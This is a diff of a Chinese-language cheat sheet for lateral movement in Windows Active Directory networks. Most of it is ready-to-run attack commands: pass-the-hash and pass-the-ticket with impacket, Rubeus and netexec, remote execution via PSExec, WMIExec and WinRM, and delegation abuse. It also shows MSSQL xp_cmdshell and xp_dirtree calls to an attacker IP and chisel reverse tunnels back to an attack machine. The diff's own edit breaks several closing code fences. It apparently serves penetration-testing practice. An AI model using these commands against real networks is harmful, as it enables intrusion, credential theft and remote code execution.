@@ -11,12 +11,12 @@ metadata: { domain: ad-win, tier: T1 }
 
 ## 0. 前置检查
 
-```
+```text
 [ ] 时钟同步: ntpdate -b <DC_IP>  ← 🔴 所有 Kerberos 操作的前提！
 [ ] 隧道验证: ss -tlnp | grep <代理端口>; ps aux | grep chisel
 [ ] 凭据去交互: 所有密码/hash/TGT 立即存文件，见 credential-spraying-password-reuse
 [ ] 工具认证模式: 每个新工具第一次认证失败 → --help 确认支持的认证方式
-```
+```text
 
 ---
 
@@ -24,7 +24,7 @@ metadata: { domain: ad-win, tier: T1 }
 
 > 无需破解密码，直接用 NT hash 认证
 
-```
+```text
 # SMB — impacket
 impacket-psexec DOMAIN/user@IP -hashes :<NTHASH>
 impacket-smbexec DOMAIN/user@IP -hashes :<NTHASH>
@@ -40,7 +40,7 @@ xfreerdp /v:IP /u:user /pth:<NTHASH> /cert:ignore
 netexec smb IP -u user -H <NTHASH> --shares
 netexec smb IP -u user -H <NTHASH> -x 'whoami'
 netexec winrm IP -u user -H <NTHASH> -x 'whoami'
-```
+```text
 
 ---
 
@@ -48,7 +48,7 @@ netexec winrm IP -u user -H <NTHASH> -x 'whoami'
 
 > 用 TGT/TGS 票据认证，不触发 4768 事件
 
-```
+```text
 # 从 Linux 导入 ccache
 export KRB5CCNAME=/path/to/user.ccache
 impacket-psexec DOMAIN/user@HOST -k -no-pass
@@ -59,7 +59,7 @@ Rubeus.exe asktgt /user:user /rc4:<NTHASH> /ptt  # Overpass-the-Hash
 
 # 从 ccache 提取 TGT
 impacket-ticketConverter ticket.kirbi ticket.ccache
-```
+```text
 
 ---
 
@@ -67,7 +67,7 @@ impacket-ticketConverter ticket.kirbi ticket.ccache
 
 > 用 AES128/AES256/RC4 Key 直接申请 TGT
 
-```
+```text
 # 用 AES key 请求 TGT
 impacket-getTGT DOMAIN/user -aesKey <AES_KEY>
 export KRB5CCNAME=user.ccache
@@ -76,13 +76,13 @@ export KRB5CCNAME=user.ccache
 Rubeus.exe asktgt /user:user /aes256:<key> /ptt
 
 🔴 AES256 Kerberoast 不可爆破 → 改用委派路径
-```
+```text
 
 ---
 
 ## 4. PSExec / SMBExec / WMIExec / AtExec
 
-```
+```text
 # PSExec (写入服务二进制 → 启动服务 — 🔴 AV 常报警)
 impacket-psexec DOMAIN/user@IP [-hashes :<HASH>] [-k]
 # 替代: WMIExec 不落盘，更隐蔽
@@ -98,13 +98,13 @@ impacket-atexec DOMAIN/user@IP 'cmd.exe /c whoami' [-hashes :<HASH>]
 
 # DCOMExec (DCOM 对象执行)
 impacket-dcomexec DOMAIN/user@IP [-hashes :<HASH>]
-```
+```text
 
 ---
 
 ## 5. WinRM
 
-```
+```text
 # 密码
 evil-winrm -i IP -u user -p 'pass'
 
@@ -117,7 +117,7 @@ evil-winrm -i HOST.DOMAIN -u user -k
 # netexec 批量
 netexec winrm IP -u user -p 'pass' -x 'whoami'
 netexec winrm 192.168.1.0/24 -u user -p 'pass'  # 子网扫描
-```
+```text
 
 ### 🆕 WinRM→SMB 双跳失败？
 → kerberos-double-hop — CredSSP/PTH/PSSessionConfiguration
@@ -126,7 +126,7 @@ netexec winrm 192.168.1.0/24 -u user -p 'pass'  # 子网扫描
 
 ## 6. RDP
 
-```
+```text
 # 密码
 xfreerdp /v:IP /u:user /p:'pass' /cert:ignore +clipboard
 
@@ -139,25 +139,25 @@ xfreerdp /v:HOST.DOMAIN /u:user /cert:ignore /kerberos:auto
 # RDP 文件模板
 full address:s:IP
 username:s:DOMAIN\user
-```
+```text
 （RDP 注入见 rdp-inception 卡）
 
 ---
 
 ## 7. 委派攻击 → 横向
 
-```
+```text
 [ ] 非约束委派:    Get-NetComputer -Unconstrained → 诱骗 DC 或打印 Spooler
 [ ] 约束委派:      Get-NetUser -TrustedToAuth → 伪造 S4U2Proxy
 [ ] RBCD:           GenericWrite/WriteDacl → 添加 msDS-AllowedToActOnBehalfOfOtherIdentity
 [ ] Shadow Credentials: GenericWrite → 添加 msDS-KeyCredentialLink → PKINIT
 # 详细命令见 ad-checklist §3 / §5
-```
+```text
 
 ---
 
 ## 8. 🆕 MSSQL 横向
-```
+```text
 # 连接 (🔴 必须用 FQDN!)
 impacket-mssqlclient DOMAIN/user:pass@<FQDN> -windows-auth
 
@@ -173,14 +173,14 @@ EXEC master..xp_dirtree '\\<ATTACK_IP>\share';
 # Linked Servers — 跨 SQL 实例跳板
 SELECT * FROM openquery("LINKED_SERVER", 'SELECT @@version');
 EXEC ('EXEC xp_cmdshell ''whoami''') AT "LINKED_SERVER";
-```
+```text
 （完整链见 mssql-attack-chain 卡）
 
 ---
 
 ## 9. netexec (nxc) 横向速查
 
-```
+```text
 # SMB 执行
 netexec smb IP -u user -p 'pass' -x 'whoami'
 netexec smb IP -u user -H <HASH> -X 'powershell -enc <B64>'
@@ -204,7 +204,7 @@ netexec ldap DC_IP -u user -p 'pass' --users
 netexec ldap DC_IP -u user -p 'pass' --computers
 netexec ldap DC_IP -u user -p 'pass' -M maq
 netexec ldap DC_IP -u user -p 'pass' -M adcs
-```
+```text
 
 ---
 
@@ -212,7 +212,7 @@ netexec ldap DC_IP -u user -p 'pass' -M adcs
 
 > 详见 tunneling-port-forwarding
 
-```
+```text
 # chisel SOCKS5 (首选)
 # 攻击机: chisel server -p 8000 --reverse
 # 跳板:   chisel client <ATTACK_IP>:8000 R:socks
@@ -226,13 +226,13 @@ ssh -D 1080 user@jumpbox
 
 # proxychains 配合
 proxychains -q impacket-psexec INTERNAL_DOMAIN/user@INTERNAL_IP -hashes :<HASH>
-```
+```text
 
 ---
 
 ## 11. 横向决策树
 
-```
+```text
 有 NT hash → PtH (PSExec/WMIExec/WinRM)
 有 AES key → PtK (getTGT) → PTT
 有密码   → WinRM > PSExec > WMIExec
@@ -241,7 +241,7 @@ proxychains -q impacket-psexec INTERNAL_DOMAIN/user@INTERNAL_IP -hashes :<HASH>
 有 GenericWrite → RBCD/Shadow Credentials
 有 MSSQL sysadmin → xp_cmdshell / UNC injection / linked servers
 什么也没有 → 内网扫描 → 密码喷洒
-```
+```text
 
 ## 反模式
 
